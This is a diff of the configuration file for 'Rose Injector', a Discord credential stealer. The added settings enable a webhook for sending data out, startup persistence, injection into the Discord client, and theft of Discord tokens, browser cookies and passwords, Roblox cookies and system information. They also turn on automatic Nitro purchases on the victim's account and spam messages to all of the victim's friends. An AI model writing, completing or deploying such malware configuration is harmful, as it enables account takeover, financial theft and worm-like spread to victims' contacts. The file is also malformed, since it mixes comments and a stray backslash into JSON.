@@ -1,8 +1,19 @@
 {
-    "webhook": "WEBHOOK HERE",
-    "debug_mode": true,
-    "footer": "Rose Injector | Made by ICExFS, Gumbobrot and WebsiTeem | github.com/DamagingRose/Rose-Injector",
-    "color": 1578778,
-    "avatar": "https://i.imgur.com/82x4nYk.jpeg"
+"HOOK": "WEBHOOK_HERE", # put your webhook in here
+"PING_METHOD": "NO_MESSAGE//NO_PING//EVERYONE//HERE", # choose between the three options
+"STARTUP": true, # move file to startup
+"INJECTION": true, # inject into the discord process
+"DISCORD_TOKEN_STEALING": true, # steal discord token
+"BROWSER_COOKIE_STEALING": true, # steal browser cookies
+"BROWSER_PASSWORD_STEALING": true, # steal browser passwords
+"ROBLOX_COOKIE_STEALING": true, # steal roblox cookie
+"SYSTEM_INFORMATION_STEALING": true, # send system information
+"AUTO_BUY_NITRO": true, \\ buy nitro automatically if payment added or already in account
+"MESSAGE_ALL_FRIENDS": true, # message all friends
+"MESSAGE_THAT_IS_BEING_SENT_TO_ALL_FRIENDS": "MESSAGE_HERE", # message that is sent to the friends \n for newline
 
+"eb_footer": "Rose-Injector | https://github.com/DamagingRose/Rose-Injector/ | Contact: Gumbobrot#4888",
+"eb_color": 16711680,
+"wh_avatar": "https://i.imgur.com/EZFAJXh.png",
+"wh_name": "Rose-Injector"
 }
